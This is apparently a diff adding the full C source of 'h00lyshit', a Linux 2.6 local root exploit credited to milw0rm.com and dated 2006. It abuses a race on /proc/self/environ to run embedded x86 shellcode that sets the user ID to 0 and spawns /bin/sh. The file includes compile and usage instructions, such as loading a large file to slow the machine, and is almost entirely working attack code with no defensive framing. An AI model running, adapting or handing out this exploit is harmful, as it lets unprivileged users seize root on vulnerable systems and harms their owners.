@@ -1,0 +1,194 @@
+/*
+** Author: h00lyshit
+** Vulnerable: Linux 2.6 ALL
+** Type of Vulnerability: Local Race
+** Tested On : various distros
+** Vendor Status: unknown
+**
+** Disclaimer:
+** In no event shall the author be liable for any damages
+** whatsoever arising out of or in connection with the use
+** or spread of this information.
+** Any use of this information is at the user's own risk.
+**
+** Compile:
+** gcc h00lyshit.c -o h00lyshit
+**
+** Usage:
+** h00lyshit <very big file on the disk>
+**
+** Example:
+** h00lyshit /usr/X11R6/lib/libethereal.so.0.0.1
+**
+** if y0u dont have one, make big file (~100MB) in /tmp with dd
+** and try to junk the cache e.g. cat /usr/lib/* >/dev/null
+**
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/prctl.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <linux/a.out.h>
+#include <asm/unistd.h>
+
+
+static struct exec ex;
+static char *e[256];
+static char *a[4];
+static char b[512];
+static char t[256];
+static volatile int *c;
+
+
+/*	h00lyshit shell code		*/
+__asm__ ("	__excode:	call	1f			\n"
+	 "	1:		mov	$23, %eax		\n"
+	 "			xor	%ebx, %ebx		\n"
+	 "			int	$0x80			\n"
+	 "			pop	%eax			\n"
+	 "			mov	$cmd-1b, %ebx		\n"
+	 "			add	%eax, %ebx		\n"
+	 "			mov	$arg-1b, %ecx		\n"
+	 "			add	%eax, %ecx		\n"
+	 "			mov	%ebx, (%ecx)		\n"
+	 "			mov	%ecx, %edx		\n"
+	 "			add	$4, %edx		\n"
+	 "			mov	$11, %eax		\n"
+	 "			int	$0x80			\n"
+	 "			mov	$1, %eax		\n"
+	 "			int	$0x80			\n"
+	 "	arg:		.quad	0x00, 0x00		\n"
+	 "	cmd:		.string		\"/bin/sh\"	\n"
+	 "	__excode_e:	nop				\n"
+	 "	.global		__excode			\n"
+	 "	.global		__excode_e			\n"
+	);
+
+
+
+extern void (*__excode) (void);
+extern void (*__excode_e) (void);
+
+
+void
+error (char *err)
+{
+  perror (err);
+  fflush (stderr);
+  exit (1);
+}
+
+
+/*	exploit this shit	*/
+void
+exploit (char *file)
+{
+  int i, fd;
+  void *p;
+  struct stat st;
+
+  printf ("\ntrying to exploit %s\n\n", file);
+  fflush (stdout);
+  chmod ("/proc/self/environ", 04755);
+  c = mmap (0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
+  memset ((void *) c, 0, 4096);
+
+  /*      slow down machine       */
+  fd = open (file, O_RDONLY);
+  fstat (fd, &st);
+  p =
+    (void *) mmap (0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+  if (p == MAP_FAILED)
+    error ("mmap");
+  prctl (PR_SET_DUMPABLE, 0, 0, 0, 0);
+  sprintf (t, "/proc/%d/environ", getpid ());
+  sched_yield ();
+  execve (NULL, a, e);
+  madvise (0, 0, MADV_WILLNEED);
+  i = fork ();
+
+  /*      give it a try           */
+  if (i)
+    {		    
+      (*c)++;
+      !madvise (p, st.st_size, MADV_WILLNEED) ? : error ("madvise");
+      prctl (PR_SET_DUMPABLE, 1, 0, 0, 0);
+      sched_yield ();	
+    }
+  else
+    {
+	    nice(10);
+	    while (!(*c));
+		sched_yield ();
+      execve (t, a, e);
+      error ("failed");
+    }
+
+  waitpid (i, NULL, 0);
+  exit (0);
+}
+
+
+int
+main (int ac, char **av)
+{
+  int i, j, k, s;
+  char *p;
+
+  memset (e, 0, sizeof (e));
+  memset (a, 0, sizeof (a));
+  a[0] = strdup (av[0]);
+  a[1] = strdup (av[0]);
+  a[2] = strdup (av[1]);
+
+  if (ac < 2)
+    error ("usage: binary <big file name>");
+  if (ac > 2)
+    exploit (av[2]);
+  printf ("\npreparing");
+  fflush (stdout);
+
+  /*      make setuid a.out       */
+  memset (&ex, 0, sizeof (ex));
+  N_SET_MAGIC (ex, NMAGIC);
+  N_SET_MACHTYPE (ex, M_386);
+  s = ((unsigned) &__excode_e) - (unsigned) &__excode;
+  ex.a_text = s;
+  ex.a_syms = -(s + sizeof (ex));
+
+  memset (b, 0, sizeof (b));
+  memcpy (b, &ex, sizeof (ex));
+  memcpy (b + sizeof (ex), &__excode, s);
+
+  /*      make environment        */
+  p = b;
+  s += sizeof (ex);
+  j = 0;
+  for (i = k = 0; i < s; i++)
+    {
+      if (!p[i])
+	{
+	  e[j++] = &p[k];
+	  k = i + 1;
+	}
+    }
+
+  /*      reexec                  */
+  getcwd (t, sizeof (t));
+  strcat (t, "/");
+  strcat (t, av[0]);
+  execve (t, a, e);
+  error ("execve");
+  return 0;
+}
+
+// milw0rm.com [2006-07-15]
